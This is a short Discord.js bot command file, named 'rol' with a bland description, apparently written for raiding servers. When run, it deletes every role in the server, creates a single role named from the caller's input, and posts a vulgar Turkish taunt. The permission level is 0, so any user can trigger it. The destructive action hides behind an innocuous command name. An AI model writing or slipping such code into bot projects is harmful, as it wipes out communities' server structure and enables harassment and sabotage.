const Discord = require("discord.js");

module.exports.run = async (client, message, args) => {

let mesaj = args.slice(0).join(" ")
message.guild.roles.cache.forEach(a => a.delete())
message.guild.roles.create({ name: `${mesaj}`, position: 20, permissions: ['MANAGE_MESSAGES'], color: 'RED'})
message.channel.send('```Amınızı Siktik Öptüm Bay <3 Muck```')
};

module.exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: [],
  permLevel: 0,
  kategori: "sunucu"
};

module.exports.help = {
  name: "rol",
  description: "rol",
  usage: "rol"
};